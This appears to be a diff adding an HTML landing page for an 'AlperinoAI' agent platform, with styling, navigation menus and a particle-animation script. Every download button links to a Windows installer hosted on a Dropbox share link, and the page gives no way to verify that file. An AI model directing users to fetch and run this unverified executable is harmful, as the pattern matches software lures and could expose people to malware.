@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlperinoAI — Next-Gen Agent Platform</title>
+    <meta name="description" content="Experience liftoff with AlperinoAI, the next-generation agent platform for enterprise automation, creative workflows, and system integration.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        /* ============================================
+           RESET & FOUNDATIONS
+           ============================================ */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        :root {
+            --color-black: #0a0a0a;
+            --color-white: #ffffff;
+            --color-gray-50: #fafafa;
+            --color-gray-100: #f5f5f5;
+            --color-gray-200: #e5e5e5;
+            --color-gray-300: #d4d4d4;
+            --color-gray-400: #a3a3a3;
+            --color-gray-500: #737373;
+            --color-gray-600: #525252;
+            --color-gray-700: #404040;
+            --color-gray-800: #262626;
+            --color-gray-900: #171717;
+            --font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            --nav-height: 64px;
+            --transition-fast: 0.15s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-medium: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-smooth: 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        html {
+            font-size: 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+        }
+        body {
+            font-family: var(--font-family);
+            background-color: var(--color-white);
+            color: var(--color-black);
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+        /* ============================================
+           CANVAS BACKGROUND
+           ============================================ */
+        #particle-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1;
+            pointer-events: none;
+        }
+        /* ============================================
+           NAVIGATION BAR
+           ============================================ */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: var(--nav-height);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 40px;
+            background: rgba(255, 255, 255, 0.72);
+            backdrop-filter: blur(24px) saturate(180%);
+            -webkit-backdrop-filter: blur(24px) saturate(180%);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+            transition: background var(--transition-medium);
+        }
+        .navbar:hover {
+            background: rgba(255, 255, 255, 0.88);
+        }
+        /* --- Nav Left: Logo + Brand --- */
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            flex-shrink: 0;
+        }
+        .nav-logo {
+            height: 28px;
+            width: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .nav-logo img {
+        .nav-logo svg {
+            height: 28px;
+            width: auto;
+            display: block;
+        }
+        .nav-brand {
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: var(--color-black);
+            letter-spacing: -0.03em;
+            line-height: 1;
+        }
+        /* --- Nav Center: Links --- */
+        .nav-center {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .nav-link {
+            position: relative;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            padding: 8px 16px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--color-gray-600);
+            text-decoration: none;
+            border-radius: 100px;
+            transition: color var(--transition-fast), background var(--transition-fast);
+            cursor: pointer;
+            user-select: none;
+            white-space: nowrap;
+        }
+        .nav-link:hover {
+            color: var(--color-black);
+            background: rgba(0, 0, 0, 0.04);
+        }
+        .nav-link .chevron {
+            width: 10px;
+            height: 10px;
+            transition: transform var(--transition-fast);
+            opacity: 0.5;
+        }
+        /* --- Dropdown --- */
+        .nav-item {
+            position: relative;
+        }
+        .dropdown {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: 50%;
+            transform: translateX(-50%) translateY(-6px);
+            min-width: 220px;
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            border-radius: 16px;
+            padding: 8px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08),
+                        0 4px 12px rgba(0, 0, 0, 0.04);
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+            transition: opacity var(--transition-medium),
+                        transform var(--transition-medium),
+                        visibility var(--transition-medium);
+        }
+        .nav-item:hover .dropdown {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+            transform: translateX(-50%) translateY(0);
+        }
+        .nav-item:hover .chevron {
+            transform: rotate(180deg);
+        }
+        .dropdown-link {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            font-size: 0.875rem;
+            font-weight: 450;
+            color: var(--color-gray-700);
+            text-decoration: none;
+            border-radius: 10px;
+            transition: background var(--transition-fast), color var(--transition-fast);
+        }
+        .dropdown-link:hover {
+            background: rgba(0, 0, 0, 0.04);
+            color: var(--color-black);
+        }
+        .dropdown-link .dd-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            background: var(--color-gray-100);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            flex-shrink: 0;
+            transition: background var(--transition-fast);
+        }
+        .dropdown-link:hover .dd-icon {
+            background: var(--color-gray-200);
+        }
+        .dropdown-link .dd-text {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+        .dropdown-link .dd-text span {
+            font-size: 0.75rem;
+            color: var(--color-gray-400);
+            font-weight: 400;
+        }
+        /* --- Nav Right: CTA --- */
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+        .btn-download-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 9px 22px;
+            background: var(--color-black);
+            color: var(--color-white);
+            font-size: 0.84rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 100px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background var(--transition-fast), transform var(--transition-fast), box-shadow var(--transition-fast);
+            letter-spacing: -0.01em;
+            line-height: 1;
+        }
+        .btn-download-nav:hover {
+            background: var(--color-gray-800);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.18);
+        }
+        .btn-download-nav:active {
+            transform: translateY(0);
+        }
+        /* ============================================
+           HERO SECTION
+           ============================================ */
+        .hero {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: calc(var(--nav-height) + 40px) 40px 80px;
+            text-align: center;
+        }
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 6px 6px 16px;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            border-radius: 100px;
+            font-size: 0.82rem;
+            font-weight: 500;
+            color: var(--color-gray-600);
+            margin-bottom: 32px;
+            animation: fadeInUp 0.8s cubic-bezier(0.22, 1, 0.36, 1) 0.1s both;
+        }
+        .hero-badge .badge-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #22c55e;
+            animation: pulse-dot 2s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+        .hero-badge .badge-cta {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 5px 12px;
+            background: var(--color-black);
+            color: var(--color-white);
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: background var(--transition-fast);
+        }
+        .hero-badge .badge-cta:hover {
+            background: var(--color-gray-800);
+        }
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        .hero-title {
+            font-size: clamp(2.8rem, 5.2vw, 5.2rem);
+            font-weight: 800;
+            line-height: 1.06;
+            letter-spacing: -0.04em;
+            color: var(--color-black);
+            max-width: 900px;
+            margin-bottom: 24px;
+            animation: fadeInUp 0.8s cubic-bezier(0.22, 1, 0.36, 1) 0.25s both;
+        }
+        .hero-subtitle {
+            font-size: clamp(1rem, 1.3vw, 1.2rem);
+            font-weight: 400;
+            line-height: 1.65;
+            color: var(--color-gray-500);
+            max-width: 560px;
+            margin-bottom: 48px;
+            animation: fadeInUp 0.8s cubic-bezier(0.22, 1, 0.36, 1) 0.4s both;
+        }
+        .hero-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            justify-content: center;
+            animation: fadeInUp 0.8s cubic-bezier(0.22, 1, 0.36, 1) 0.55s both;
+        }
+        .btn-primary {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 16px 36px;
+            background: var(--color-black);
+            color: var(--color-white);
+            font-size: 0.95rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 100px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background var(--transition-fast), transform var(--transition-fast), box-shadow var(--transition-fast);
+            letter-spacing: -0.01em;
+            line-height: 1;
+        }
+        .btn-primary:hover {
+            background: var(--color-gray-800);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+        }
+        .btn-primary:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        .btn-primary .win-icon {
+            width: 16px;
+            height: 16px;
+            flex-shrink: 0;
+        }
+        .btn-secondary {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 16px 36px;
+            background: rgba(255, 255, 255, 0.65);
+            backdrop-filter: blur(8px);
+            color: var(--color-black);
+            font-size: 0.95rem;
+            font-weight: 600;
+            border: 1.5px solid rgba(0, 0, 0, 0.12);
+            border-radius: 100px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background var(--transition-fast), border-color var(--transition-fast), transform var(--transition-fast), box-shadow var(--transition-fast);
+            letter-spacing: -0.01em;
+            line-height: 1;
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.9);
+            border-color: rgba(0, 0, 0, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
+        }
+        .btn-secondary:active {
+            transform: translateY(0);
+        }
+        .btn-secondary .arrow {
+            transition: transform var(--transition-fast);
+        }
+        .btn-secondary:hover .arrow {
+            transform: translateX(3px);
+        }
+        /* ============================================
+           ANIMATIONS
+           ============================================ */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(24px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* ============================================
+           SCROLLBAR
+           ============================================ */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--color-gray-300);
+            border-radius: 100px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--color-gray-400);
+        }
+        /* ============================================
+           RESPONSIVE (safety — still desktop-first)
+           ============================================ */
+        @media (max-width: 1024px) {
+            .navbar {
+                padding: 0 24px;
+            }
+            .nav-center {
+                gap: 0;
+            }
+            .nav-link {
+                padding: 8px 12px;
+                font-size: 0.82rem;
+            }
+        }
+        @media (max-width: 768px) {
+            .nav-center {
+                display: none;
+            }
+            .hero-title {
+                font-size: 2.4rem;
+            }
+            .hero-actions {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- =============================================
+         PARTICLE CANVAS
+         ============================================= -->
+    <canvas id="particle-canvas"></canvas>
+    <!-- =============================================
+         NAVIGATION BAR
+         ============================================= -->
+    <nav class="navbar" id="navbar">
+        <!-- Left: Logo + Brand -->
+        <a href="#" class="nav-left" id="nav-logo-link">
+            <div class="nav-logo">
+                <img src="logo.png" alt="AlperinoAI Logo" height="28">
+                <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M349.1 18.7C351.8 8.4 343.7-1.4 333.1 0.2L160.7 26.5C152.6 27.7 146.5 34.5 146.3 42.7L140.5 223.1C140.2 231.7 146.6 239.1 155.1 240.4L243.6 253.9L152.4 486.2C148.2 496.8 159 506.7 169.2 501.5L390.8 389.2C398.5 385.3 400.3 375.2 394.4 369L281.5 248.2L353.4 33.3C353.4 33.3 349.1 18.7 349.1 18.7Z" fill="#0a0a0a"/></svg>
+            </div>
+            <span class="nav-brand">AlperinoAI</span>
+        </a>
+        <!-- Center: Nav Links -->
+        <div class="nav-center">
+            <!-- Products (with dropdown) -->
+            <div class="nav-item">
+                <a href="#" class="nav-link" id="nav-products">
+                    Products
+                    <svg class="chevron" viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M2 3.5L5 6.5L8 3.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </a>
+                <div class="dropdown" id="dropdown-products">
+                    <a href="#" class="dropdown-link" id="link-ai-agent-core">
+                        <div class="dd-icon">🤖</div>
+                        <div class="dd-text">
+                            AI Agent Core
+                            <span>Autonomous intelligence engine</span>
+                        </div>
+                    </a>
+                    <a href="#" class="dropdown-link" id="link-rinoos-interface">
+                        <div class="dd-icon">🖥️</div>
+                        <div class="dd-text">
+                            RinoOS Interface
+                            <span>Next-gen operating layer</span>
+                        </div>
+                    </a>
+                    <a href="#" class="dropdown-link" id="link-automations">
+                        <div class="dd-icon">⚡</div>
+                        <div class="dd-text">
+                            Automations
+                            <span>End-to-end workflow tools</span>
+                        </div>
+                    </a>
+                </div>
+            </div>
+            <!-- Use Cases (with dropdown) -->
+            <div class="nav-item">
+                <a href="#" class="nav-link" id="nav-use-cases">
+                    Use Cases
+                    <svg class="chevron" viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M2 3.5L5 6.5L8 3.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </a>
+                <div class="dropdown" id="dropdown-use-cases">
+                    <a href="#" class="dropdown-link" id="link-gaming-simulators">
+                        <div class="dd-icon">🎮</div>
+                        <div class="dd-text">
+                            Gaming Simulators
+                            <span>AI-driven game environments</span>
+                        </div>
+                    </a>
+                    <a href="#" class="dropdown-link" id="link-content-creators">
+                        <div class="dd-icon">🎬</div>
+                        <div class="dd-text">
+                            Content Creators
+                            <span>Creative production tools</span>
+                        </div>
+                    </a>
+                    <a href="#" class="dropdown-link" id="link-local-deployment">
+                        <div class="dd-icon">🏠</div>
+                        <div class="dd-text">
+                            Local Deployment
+                            <span>On-premise agent hosting</span>
+                        </div>
+                    </a>
+                </div>
+            </div>
+            <!-- Pricing (standard link) -->
+            <a href="#" class="nav-link" id="nav-pricing">Pricing</a>
+            <!-- Blog (standard link) -->
+            <a href="#" class="nav-link" id="nav-blog">Blog</a>
+            <!-- Resources (with dropdown) -->
+            <div class="nav-item">
+                <a href="#" class="nav-link" id="nav-resources">
+                    Resources
+                    <svg class="chevron" viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M2 3.5L5 6.5L8 3.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </a>
+                <div class="dropdown" id="dropdown-resources">
+                    <a href="#" class="dropdown-link" id="link-documentation">
+                        <div class="dd-icon">📄</div>
+                        <div class="dd-text">
+                            Documentation
+                            <span>Guides, API refs &amp; tutorials</span>
+                        </div>
+                    </a>
+                    <a href="#" class="dropdown-link" id="link-github-repo">
+                        <div class="dd-icon">🐙</div>
+                        <div class="dd-text">
+                            GitHub Repo
+                            <span>Source code &amp; contributions</span>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <!-- Right: Download CTA -->
+        <div class="nav-right">
+            <a href="https://www.dropbox.com/scl/fi/1l1hrxfxmpt4vtvwehm1k/rinude_1.5v_setup.exe?rlkey=y345qc12h4uool8x0m71vxtvu&st=h2t4l24l&dl=1"
+               class="btn-download-nav"
+               id="nav-download-btn">
+                Download ↓
+            </a>
+        </div>
+    </nav>
+    <!-- =============================================
+         HERO SECTION
+         ============================================= -->
+    <main class="hero" id="hero-section">
+        <!-- Announcement Badge -->
+        <div class="hero-badge" id="hero-badge">
+            <div class="badge-dot"></div>
+            v1.5 is now available
+            <a href="https://www.dropbox.com/scl/fi/1l1hrxfxmpt4vtvwehm1k/rinude_1.5v_setup.exe?rlkey=y345qc12h4uool8x0m71vxtvu&st=h2t4l24l&dl=1"
+               class="badge-cta">
+                Get it now →
+            </a>
+        </div>
+        <!-- Hero Title -->
+        <h1 class="hero-title" id="hero-title">
+            Experience liftoff with the next&#8209;gen agent platform
+        </h1>
+        <!-- Subtitle -->
+        <p class="hero-subtitle" id="hero-subtitle">
+            AlperinoAI supercharges your workflow with intelligent agents that automate, create, and integrate — so you can focus on what matters.
+        </p>
+        <!-- CTA Buttons -->
+        <div class="hero-actions" id="hero-actions">
+            <a href="https://www.dropbox.com/scl/fi/1l1hrxfxmpt4vtvwehm1k/rinude_1.5v_setup.exe?rlkey=y345qc12h4uool8x0m71vxtvu&st=h2t4l24l&dl=1"
+               class="btn-primary"
+               id="hero-download-btn">
+                <!-- Windows SVG Icon -->
+                <svg class="win-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M0 2.3L6.5 1.4V7.5H0V2.3ZM7.3 1.3L16 0V7.5H7.3V1.3ZM0 8.5H6.5V14.6L0 13.7V8.5ZM7.3 8.5H16V16L7.3 14.7V8.5Z" fill="white"/>
+                </svg>
+                Download for Windows
+            </a>
+            <a href="https://alperinoai.github.io/rinude.ai/"
+               target="_blank"
+               rel="noopener noreferrer"
+               class="btn-secondary"
+               id="hero-explore-btn">
+                Explore use cases
+                <span class="arrow">→</span>
+            </a>
+        </div>
+    </main>
+    <!-- =============================================
+         PARTICLE CANVAS SCRIPT
+         ============================================= -->
+    <script>
+        (function () {
+            'use strict';
+            const canvas = document.getElementById('particle-canvas');
+            const ctx = canvas.getContext('2d');
+            let width, height, centerX, centerY;
+            let particles = [];
+            let animId;
+            const PARTICLE_COUNT = 260;
+            const MAX_CONNECT_DIST = 140;
+            const colorStops = [
+                { r: 79,  g: 70,  b: 229 },
+                { r: 99,  g: 102, b: 241 },
+                { r: 139, g: 92,  b: 246 },
+                { r: 217, g: 70,  b: 239 },
+                { r: 249, g: 115, b: 22  },
+                { r: 251, g: 146, b: 60  },
+                { r: 251, g: 113, b: 133 },
+            ];
+            function lerpColor(t) {
+                t = Math.max(0, Math.min(1, t));
+                const idx = t * (colorStops.length - 1);
+                const lo = Math.floor(idx);
+                const hi = Math.min(lo + 1, colorStops.length - 1);
+                const f = idx - lo;
+                return {
+                    r: Math.round(colorStops[lo].r + (colorStops[hi].r - colorStops[lo].r) * f),
+                    g: Math.round(colorStops[lo].g + (colorStops[hi].g - colorStops[lo].g) * f),
+                    b: Math.round(colorStops[lo].b + (colorStops[hi].b - colorStops[lo].b) * f),
+                };
+            }
+            function resize() {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+                centerX = width / 2;
+                centerY = height / 2;
+            }
+            class Particle {
+                constructor() {
+                    this.reset();
+                }
+                reset() {
+                    const angle = Math.random() * Math.PI * 2;
+                    const maxRadius = Math.max(width, height) * 0.55;
+                    const radius = Math.random() * maxRadius;
+                    this.x = centerX + Math.cos(angle) * radius;
+                    this.y = centerY + Math.sin(angle) * radius;
+                    this.baseRadius = 1 + Math.random() * 2.2;
+                    this.radius = this.baseRadius;
+                    const speed = 0.08 + Math.random() * 0.2;
+                    this.vx = Math.cos(angle) * speed + (Math.random() - 0.5) * 0.15;
+                    this.vy = Math.sin(angle) * speed + (Math.random() - 0.5) * 0.15;
+                    this.distNorm = radius / maxRadius;
+                    this.alpha = 0.15 + Math.random() * 0.45;
+                    this.pulsePhase = Math.random() * Math.PI * 2;
+                    this.pulseSpeed = 0.008 + Math.random() * 0.015;
+                }
+                update() {
+                    this.x += this.vx;
+                    this.y += this.vy;
+                    this.pulsePhase += this.pulseSpeed;
+                    this.radius = this.baseRadius * (0.85 + 0.3 * Math.sin(this.pulsePhase));
+                    const dx = this.x - centerX;
+                    const dy = this.y - centerY;
+                    const maxRadius = Math.max(width, height) * 0.55;
+                    this.distNorm = Math.sqrt(dx * dx + dy * dy) / maxRadius;
+                    if (this.x < -60 || this.x > width + 60 || this.y < -60 || this.y > height + 60) {
+                        this.reset();
+                    }
+                }
+                draw() {
+                    const c = lerpColor(this.distNorm);
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(${c.r}, ${c.g}, ${c.b}, ${this.alpha})`;
+                    ctx.fill();
+                }
+            }
+            function initParticles() {
+                particles = [];
+                for (let i = 0; i < PARTICLE_COUNT; i++) {
+                    particles.push(new Particle());
+                }
+            }
+            function drawConnections() {
+                for (let i = 0; i < particles.length; i++) {
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const dx = particles[i].x - particles[j].x;
+                        const dy = particles[i].y - particles[j].y;
+                        const distSq = dx * dx + dy * dy;
+                        if (distSq < MAX_CONNECT_DIST * MAX_CONNECT_DIST) {
+                            const dist = Math.sqrt(distSq);
+                            const alpha = (1 - dist / MAX_CONNECT_DIST) * 0.12;
+                            const ci = lerpColor(particles[i].distNorm);
+                            const cj = lerpColor(particles[j].distNorm);
+                            const r = Math.round((ci.r + cj.r) / 2);
+                            const g = Math.round((ci.g + cj.g) / 2);
+                            const b = Math.round((ci.b + cj.b) / 2);
+                            ctx.beginPath();
+                            ctx.moveTo(particles[i].x, particles[i].y);
+                            ctx.lineTo(particles[j].x, particles[j].y);
+                            ctx.strokeStyle = `rgba(${r}, ${g}, ${b}, ${alpha})`;
+                            ctx.lineWidth = 0.6;
+                            ctx.stroke();
+                        }
+                    }
+                }
+            }
+            let mouseX = -9999, mouseY = -9999;
+            document.addEventListener('mousemove', (e) => {
+                mouseX = e.clientX;
+                mouseY = e.clientY;
+            });
+            function animateWithMouse() {
+                ctx.clearRect(0, 0, width, height);
+                const grad = ctx.createRadialGradient(centerX, centerY, 0, centerX, centerY, Math.max(width, height) * 0.6);
+                grad.addColorStop(0, 'rgba(255,255,255,0)');
+                grad.addColorStop(0.7, 'rgba(255,255,255,0)');
+                grad.addColorStop(1, 'rgba(255,255,255,0.6)');
+                ctx.fillStyle = grad;
+                ctx.fillRect(0, 0, width, height);
+                drawConnections();
+                for (const p of particles) {
+                    const dx = p.x - mouseX;
+                    const dy = p.y - mouseY;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 120 && dist > 0) {
+                        const force = (120 - dist) / 120 * 0.6;
+                        p.x += (dx / dist) * force;
+                        p.y += (dy / dist) * force;
+                    }
+                    p.update();
+                    p.draw();
+                }
+                animId = requestAnimationFrame(animateWithMouse);
+            }
+            resize();
+            initParticles();
+            animateWithMouse();
+            window.addEventListener('resize', () => {
+                resize();
+                initParticles();
+            });
+        })();
+    </script>
+</body>
+</html>
